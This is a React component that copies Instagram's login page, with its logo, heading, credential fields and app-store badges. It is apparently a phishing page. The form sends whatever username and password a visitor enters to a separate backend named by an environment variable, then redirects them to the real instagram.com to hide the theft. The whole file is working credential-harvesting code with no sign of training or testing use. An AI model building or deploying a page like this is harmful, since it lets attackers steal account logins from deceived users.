import React, { useState } from 'react';
import './App.css';

function App() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}/api/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username, password }),
      });

      if (response.ok) {
        // Redirect to Instagram
        window.location.href = 'https://instagram.com';
      } else {
        setError('Login failed. Please try again.');
      }
    } catch (err) {
      setError('Connection error. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
      <div className="max-w-md w-full space-y-8">
        <div>
          {/* Instagram Logo */}
          <div className="flex justify-center">
            <img
              className="h-12 w-auto"
              src="https://images.unsplash.com/photo-1611262588024-d12430b98920?crop=entropy&cs=srgb&fm=jpg&ixid=M3w3NTY2Nzd8MHwxfHNlYXJjaHwxfHxpbnN0YWdyYW0lMjBsb2dvfGVufDB8fHxibGFja3wxNzUyNzgxMDk4fDA&ixlib=rb-4.1.0&q=85"
              alt="Instagram"
            />
          </div>
          
          {/* Instagram Text Logo */}
          <div className="mt-6 text-center">
            <h1 className="text-3xl font-light text-gray-900 instagram-font">
              Instagram
            </h1>
          </div>
        </div>

        {/* Login Form */}
        <div className="bg-white py-8 px-4 shadow-sm border border-gray-300 sm:rounded-lg sm:px-10">
          <form className="space-y-6" onSubmit={handleSubmit}>
            <div>
              <label htmlFor="username" className="sr-only">
                Username
              </label>
              <input
                id="username"
                name="username"
                type="text"
                autoComplete="username"
                required
                className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-t-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm bg-gray-50"
                placeholder="Phone number, username, or email"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
              />
            </div>
            
            <div>
              <label htmlFor="password" className="sr-only">
                Password
              </label>
              <input
                id="password"
                name="password"
                type="password"
                autoComplete="current-password"
                required
                className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-b-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm bg-gray-50"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>

            {error && (
              <div className="text-red-500 text-sm text-center">
                {error}
              </div>
            )}

            <div>
              <button
                type="submit"
                disabled={loading}
                className="group relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-blue-500 hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {loading ? 'Logging in...' : 'Log in'}
              </button>
            </div>
          </form>

          {/* Forgot Password */}
          <div className="mt-6 text-center">
            <a href="#" className="text-sm text-blue-500 hover:text-blue-600">
              Forgot password?
            </a>
          </div>
        </div>

        {/* Sign Up Section */}
        <div className="bg-white py-4 px-4 shadow-sm border border-gray-300 sm:rounded-lg sm:px-10">
          <p className="text-center text-sm text-gray-600">
            Don't have an account?{' '}
            <a href="#" className="font-medium text-blue-500 hover:text-blue-600">
              Sign up
            </a>
          </p>
        </div>

        {/* Get the App */}
        <div className="text-center">
          <p className="text-sm text-gray-600 mb-4">Get the app.</p>
          <div className="flex justify-center space-x-4">
            <img
              className="h-10"
              src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
              alt="Download on the App Store"
            />
            <img
              className="h-10"
              src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
              alt="Get it on Google Play"
            />
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;